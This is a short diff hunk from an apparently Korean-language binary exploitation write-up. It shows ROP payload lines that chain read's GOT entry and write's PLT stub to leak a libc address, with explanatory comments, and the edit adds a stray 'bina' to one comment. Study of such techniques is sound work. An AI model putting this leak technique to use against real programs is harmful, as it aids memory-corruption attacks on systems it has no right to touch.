@@ -37,7 +37,7 @@ ret         0x4005a9
     payload += p64(read_got)    #plt는 got참조하여 실행하니 got주소 알아야함
     payload += p64(0)
     payload += p64(write_plt)   #read_got 출력시키기
-        read_got주소 출력시키기
+        read_got주소 출력시키기bina
     
 
 ## Vulnerability Root Cause
